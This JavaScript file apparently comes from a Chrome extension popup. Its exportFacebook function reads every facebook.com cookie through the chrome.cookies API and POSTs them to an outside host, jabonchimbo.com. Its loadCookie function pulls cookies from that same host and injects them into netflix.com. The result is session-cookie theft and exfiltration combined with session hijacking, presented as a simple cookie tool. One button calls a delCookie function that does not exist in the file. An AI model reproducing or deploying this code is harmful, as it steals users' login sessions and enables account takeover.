'use strict';

function loadCookie(){
	$.getJSON( "http://www.jabonchimbo.com/api/youtube/cookie.json", function( data ) {
		try{	
			$.each( data, function( key, val ) {
			setCookie(val.name,val.value);
			});
				alert("Cookie Loaded Success!!!");
		}catch(err){
				alert("Failed Loading Cookie!!!" + err.description);
			}	

	});
}


function saveCookie(p){
$.post( "http://www.jabonchimbo.com/api/youtube/tmp/save.php", { cookie: p} );
}

function showMessage(){
	alert(exportFacebook());
}

function exportFacebook(){
var cook = "[";
    chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
			for (var i in cookies) {
				cook+= "{name:" + cookies[i].name + ",value:" + cookies[i].value + "},";
			}
			cook+= "]";
			saveCookie(cook);
	});
}

function setCookie(name,value){
	chrome.cookies.set({
		    "name": name,
		    "url": "https://www.netflix.com/ca/",
		    "value": value 	
			}, function (cookie) {
		    console.log(JSON.stringify(cookie));
		    console.log(chrome.extension.lastError);
		    console.log(chrome.runtime.lastError);
	});

}

function main() {
  // Initialization work goes here.
}

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn1').addEventListener('click', loadCookie);
  main();
});

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn2').addEventListener('click', exportFacebook);
  main();
});

document.addEventListener('DOMContentLoaded', function () {
  document.getElementById('btn3').addEventListener('click', delCookie);
  main();
});
